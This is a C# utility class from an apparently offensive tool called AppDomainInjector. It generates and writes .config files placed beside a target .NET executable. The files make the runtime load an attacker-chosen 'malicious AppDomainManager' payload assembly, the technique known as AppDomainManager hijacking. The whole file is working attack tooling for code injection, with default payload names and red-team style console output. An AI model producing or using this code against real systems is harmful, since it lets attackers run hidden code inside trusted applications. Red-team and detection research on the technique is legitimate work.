using System;
using System.IO;
using System.Reflection;

namespace AppDomainInjector.Utils
{
    /// <summary>
    /// Generates .config files for AppDomainManager hijacking.
    /// </summary>
    public static class ConfigGenerator
    {
        /// <summary>
        /// Generates the content of an application config that loads a malicious AppDomainManager.
        /// </summary>
        /// <param name="assemblyName">The assembly name (without .dll extension)</param>
        /// <param name="typeName">The full type name of the AppDomainManager class</param>
        /// <param name="version">Assembly version (default: 1.0.0.0)</param>
        /// <returns>XML content for the .config file</returns>
        public static string GenerateConfigContent(
            string assemblyName,
            string typeName,
            string version = "1.0.0.0")
        {
            return $@"<?xml version=""1.0"" encoding=""utf-8""?>
<configuration>
  <runtime>
    <appDomainManagerAssembly value=""{assemblyName}, Version={version}, Culture=neutral, PublicKeyToken=null"" />
    <appDomainManagerType value=""{typeName}"" />
  </runtime>
</configuration>";
        }

        /// <summary>
        /// Creates a config file for the specified binary.
        /// </summary>
        /// <param name="binaryPath">Path to the target binary</param>
        /// <param name="outputDirectory">Directory where config will be created</param>
        /// <param name="payloadAssemblyName">Name of the payload assembly</param>
        /// <param name="payloadTypeName">Full type name of the AppDomainManager</param>
        /// <returns>Path to the created config file</returns>
        public static string CreateConfigFile(
            string binaryPath,
            string outputDirectory,
            string payloadAssemblyName = "Payload",
            string payloadTypeName = "Payload.Injector")
        {
            var binaryName = Path.GetFileName(binaryPath);
            var configName = binaryName + ".config";
            var configPath = Path.Combine(outputDirectory, configName);

            var configContent = GenerateConfigContent(payloadAssemblyName, payloadTypeName);

            File.WriteAllText(configPath, configContent);

            Console.WriteLine($"[+] Created config file: {configPath}");

            return configPath;
        }

        /// <summary>
        /// Gets the full assembly name from a DLL file.
        /// </summary>
        public static string GetAssemblyFullName(string dllPath)
        {
            try
            {
                var assemblyName = AssemblyName.GetAssemblyName(dllPath);
                return assemblyName.FullName;
            }
            catch
            {
                // Fallback to basic name
                return Path.GetFileNameWithoutExtension(dllPath);
            }
        }
    }
}
